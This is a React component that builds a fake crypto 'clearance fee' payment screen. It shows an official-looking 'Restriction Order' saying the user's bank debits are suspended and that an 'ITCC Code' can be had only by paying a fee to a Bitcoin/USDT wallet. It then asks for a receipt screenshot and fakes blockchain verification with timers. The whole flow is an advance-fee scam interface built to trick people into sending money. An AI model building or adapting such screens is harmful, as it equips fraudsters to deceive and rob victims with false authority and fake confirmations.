
import React, { useState, useRef } from 'react';
import { 
    SpinnerIcon, 
    CheckCircleIcon, 
    WalletIcon, 
    QrCodeIcon, 
    ClipboardDocumentIcon, 
    ArrowLeftIcon, 
    DocumentCheckIcon, 
    ExclamationTriangleIcon,
    CloudArrowUpIcon
} from './Icons.tsx';

interface SmartWalletPaymentProps {
    amount: number;
    onPaymentConfirmed: () => void;
    onBack: () => void;
}

type Step = 'restriction_notice' | 'payment_details' | 'upload_receipt' | 'processing' | 'success';

export const SmartWalletPayment: React.FC<SmartWalletPaymentProps> = ({ amount, onPaymentConfirmed, onBack }) => {
    const [step, setStep] = useState<Step>('restriction_notice');
    const [receiptFile, setReceiptFile] = useState<string | null>(null);
    const [isCopied, setIsCopied] = useState(false);
    const fileInputRef = useRef<HTMLInputElement>(null);

    // Mock Smart Wallet Address
    const walletAddress = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"; 

    const handleCopy = () => {
        navigator.clipboard.writeText(walletAddress);
        setIsCopied(true);
        setTimeout(() => setIsCopied(false), 2000);
    };

    const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const file = e.target.files?.[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = () => {
                setReceiptFile(reader.result as string);
            };
            reader.readAsDataURL(file);
        }
    };

    const handleSubmitReceipt = () => {
        if (!receiptFile) return;
        setStep('processing');
        
        // Simulate verification delay
        setTimeout(() => {
            setStep('success');
            // After showing success message for a bit, trigger the callback
            setTimeout(onPaymentConfirmed, 4000);
        }, 3000);
    };

    return (
        <div className="bg-slate-900 text-slate-100 rounded-2xl shadow-2xl w-full max-w-md m-4 animate-fade-in-up relative border border-red-500/30 overflow-hidden">
            {/* Header */}
            <div className="p-4 border-b border-white/10 flex items-center justify-between bg-red-500/10">
                <button onClick={onBack} className="flex items-center space-x-2 text-sm font-semibold text-slate-400 hover:text-white transition-colors">
                    <ArrowLeftIcon className="w-4 h-4" />
                    <span>Back</span>
                </button>
                <div className="flex items-center space-x-2 text-red-400">
                    <ExclamationTriangleIcon className="w-5 h-5" />
                    <span className="font-bold text-xs uppercase tracking-wider">Restriction Order #992-A</span>
                </div>
            </div>

            <div className="p-6">
                {step === 'restriction_notice' && (
                    <div className="text-center space-y-6">
                        <div className="inline-flex items-center justify-center w-20 h-20 bg-red-500/10 rounded-full ring-1 ring-red-500/50 mb-2">
                            <WalletIcon className="w-10 h-10 text-red-500" />
                        </div>
                        <h3 className="text-xl font-bold text-white">Smart Wallet Restriction</h3>
                        <div className="bg-red-950/50 border border-red-900/50 p-4 rounded-lg text-sm text-red-200 text-left space-y-2">
                            <p><strong>NOTICE:</strong> Direct bank debits are currently suspended for this account due to compliance checks.</p>
                            <p>To lift this restriction and obtain your <strong>ITCC Code</strong>, you must settle the clearance fee via the secure Smart Wallet gateway.</p>
                        </div>
                        <button onClick={() => setStep('payment_details')} className="w-full py-3 bg-primary hover:bg-primary-600 text-white rounded-lg font-bold shadow-lg transition-all">
                            Proceed to Smart Wallet
                        </button>
                    </div>
                )}

                {step === 'payment_details' && (
                    <div className="space-y-6">
                        <div className="text-center">
                            <p className="text-sm text-slate-400">Total Clearance Fee</p>
                            <p className="text-3xl font-mono font-bold text-white mt-1">{amount.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}</p>
                        </div>

                        <div className="bg-white p-4 rounded-xl mx-auto w-48 h-48 flex items-center justify-center shadow-inner">
                            <img src={`https://quickchart.io/qr?text=${walletAddress}&size=200`} alt="Wallet QR" className="w-full h-full" />
                        </div>

                        <div className="space-y-2">
                            <label className="text-xs text-slate-500 uppercase font-bold">Smart Wallet Address (BTC/USDT)</label>
                            <div className="flex items-center gap-2 bg-slate-950 border border-slate-700 p-3 rounded-lg">
                                <span className="font-mono text-xs text-slate-300 truncate flex-1">{walletAddress}</span>
                                <button onClick={handleCopy} className="text-primary hover:text-white transition-colors">
                                    {isCopied ? <CheckCircleIcon className="w-5 h-5 text-green-500"/> : <ClipboardDocumentIcon className="w-5 h-5"/>}
                                </button>
                            </div>
                        </div>

                        <button onClick={() => setStep('upload_receipt')} className="w-full py-3 bg-primary hover:bg-primary-600 text-white rounded-lg font-bold shadow-lg transition-all">
                            I Have Made Payment
                        </button>
                    </div>
                )}

                {step === 'upload_receipt' && (
                    <div className="space-y-6 text-center">
                        <h3 className="text-lg font-bold text-white">Confirm Payment</h3>
                        <p className="text-sm text-slate-400">Please upload a clear screenshot of your payment transaction for verification.</p>

                        <div 
                            onClick={() => fileInputRef.current?.click()}
                            className={`border-2 border-dashed rounded-xl p-8 cursor-pointer transition-all ${receiptFile ? 'border-green-500 bg-green-500/10' : 'border-slate-700 hover:border-primary hover:bg-slate-800'}`}
                        >
                            <input type="file" ref={fileInputRef} onChange={handleFileChange} className="hidden" accept="image/*" />
                            
                            {receiptFile ? (
                                <div className="relative">
                                    <img src={receiptFile} alt="Receipt" className="max-h-40 mx-auto rounded-lg shadow-lg" />
                                    <div className="mt-2 flex items-center justify-center text-green-400 gap-2 text-sm font-bold">
                                        <CheckCircleIcon className="w-4 h-4" /> Image Selected
                                    </div>
                                </div>
                            ) : (
                                <div className="flex flex-col items-center gap-3 text-slate-500">
                                    <CloudArrowUpIcon className="w-12 h-12" />
                                    <span>Tap to upload receipt</span>
                                </div>
                            )}
                        </div>

                        <button 
                            onClick={handleSubmitReceipt} 
                            disabled={!receiptFile}
                            className="w-full py-3 bg-green-600 hover:bg-green-500 text-white rounded-lg font-bold shadow-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                        >
                            <DocumentCheckIcon className="w-5 h-5" />
                            Submit for Confirmation
                        </button>
                    </div>
                )}

                {step === 'processing' && (
                    <div className="py-12 text-center space-y-6">
                        <div className="relative w-20 h-20 mx-auto">
                            <div className="absolute inset-0 border-4 border-slate-700 rounded-full"></div>
                            <div className="absolute inset-0 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
                        </div>
                        <div>
                            <h3 className="text-lg font-bold text-white">Verifying Blockchain Transaction...</h3>
                            <p className="text-sm text-slate-400 mt-2">This usually takes 1-3 minutes.</p>
                        </div>
                    </div>
                )}

                {step === 'success' && (
                    <div className="py-8 text-center space-y-4 animate-fade-in-up">
                        <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto shadow-[0_0_20px_rgba(34,197,94,0.4)]">
                            <CheckCircleIcon className="w-10 h-10 text-white" />
                        </div>
                        <h3 className="text-2xl font-bold text-white">Receipt Confirmed</h3>
                        <div className="bg-slate-800/50 p-4 rounded-lg border border-white/10 text-sm text-slate-300">
                            <p>The ITCC Compliance Code has been issued.</p>
                            <p className="mt-2 text-primary-400 font-semibold">Check your Email & SMS for the code.</p>
                        </div>
                        <p className="text-xs text-slate-500">Redirecting to code entry screen...</p>
                    </div>
                )}
            </div>
        </div>
    );
};
